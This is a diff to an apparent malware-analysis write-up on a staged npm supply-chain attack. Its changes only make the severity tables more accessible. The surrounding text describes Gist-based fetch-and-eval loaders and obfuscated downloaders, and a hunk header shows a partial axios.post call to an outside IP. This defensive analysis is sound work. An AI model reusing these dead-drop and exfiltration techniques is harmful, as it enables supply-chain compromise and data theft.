@@ -38,11 +38,11 @@ The loader pulls the Gist's first file from the GitHub API and evals its text, s
 </code></pre>
 {% endraw %}
 
-| | Trait | Evidence |
+| <span class="visually-hidden">Severity</span> | Trait | Evidence |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/channel/deaddrop/github` | GitHub Gist API content executed with `eval` [T1102.003, T1059.007] |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/hidden-payload/staging` | npm package loads and evals GitHub Gist API content [T1195.002] |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/fetch-eval` | Fetch remote code and eval in memory [T1059.007] |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/command-and-control/channel/deaddrop/github` | GitHub Gist API content executed with `eval` [T1102.003, T1059.007] |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/supply-chain/hidden-payload/staging` | npm package loads and evals GitHub Gist API content [T1195.002] |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/command-and-control/dropper/delivery/fetch-eval` | Fetch remote code and eval in memory [T1059.007] |
 
 ## Stage 2 — what the Gist serves
 
@@ -57,12 +57,12 @@ The Gist body is a javascript-obfuscator blob; decoded, it does four things in o
 </code></pre>
 {% endraw %}
 
-| | Trait | Evidence |
+| <span class="visually-hidden">Severity</span> | Trait | Evidence |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/execution/network-stage` | Obfuscated Node hidden-stage downloader [T1105, T1059.007, T1027] |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/hidden-payload/runtime` | Obfuscated Node loader hides staged execution [T1195.002, T1105] |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/obfuscation/tools/js-obfuscator` | Advanced array-shuffling decoder loop [T1027.002] |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/process/create/spawn` | `windowsHide` set via expression on the spawn |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/command-and-control/dropper/execution/network-stage` | Obfuscated Node hidden-stage downloader [T1105, T1059.007, T1027] |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/supply-chain/hidden-payload/runtime` | Obfuscated Node loader hides staged execution [T1195.002, T1105] |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/anti-static/obfuscation/tools/js-obfuscator` | Advanced array-shuffling decoder loop [T1027.002] |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `micro-behaviors/process/create/spawn` | `windowsHide` set via expression on the spawn |
 
 ## Stage 3 — the fan-out
 
@@ -89,9 +89,9 @@ axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://144.172.117
 
 The on-disk stage-3 file is one obfuscated line, so the four drops above were recovered by running the chain under instrumentation — every fetch, write, and spawn stubbed and logged — not by reading them.
 
-| | Trait | Evidence |
+| <span class="visually-hidden">Severity</span> | Trait | Evidence |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/data-file` | Single-line obfuscated payload contains Node stage runtime [T1027, T1059.007] |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/anti-static/obfuscation/payload/data-file` | Single-line obfuscated payload contains Node stage runtime [T1027, T1059.007] |
 
 ## Same kit, new address
 
